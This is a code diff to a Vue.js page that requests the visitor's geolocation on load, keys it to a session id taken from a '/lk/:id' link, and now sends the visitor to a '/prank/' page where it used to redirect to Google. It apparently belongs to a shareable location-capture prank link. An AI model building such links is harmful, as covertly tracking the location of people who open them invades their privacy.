@@ -12,7 +12,11 @@ export default {
   mounted() {
     this.getLocation()
   },
-
+  data() {
+    return {
+      session_id: null
+    }
+  },
   methods: {
     getLocation() {
       if (!navigator.geolocation) {
@@ -22,6 +26,8 @@ export default {
 
       // /lk/:id
       const session_id = this.$route.params.id
+      this.session_id = session_id
+
       if (!session_id) {
         this.redirectToGoogle()
         return
@@ -67,8 +73,8 @@ export default {
     },
 
     redirectToGoogle() {
-      // 🔹 Replace → back bosilganda qaytib kelmasin
-      window.location.replace('https://www.google.com')
+      this.$router.push(`/prank/${this.session_id}`)
+
     }
   }
 }
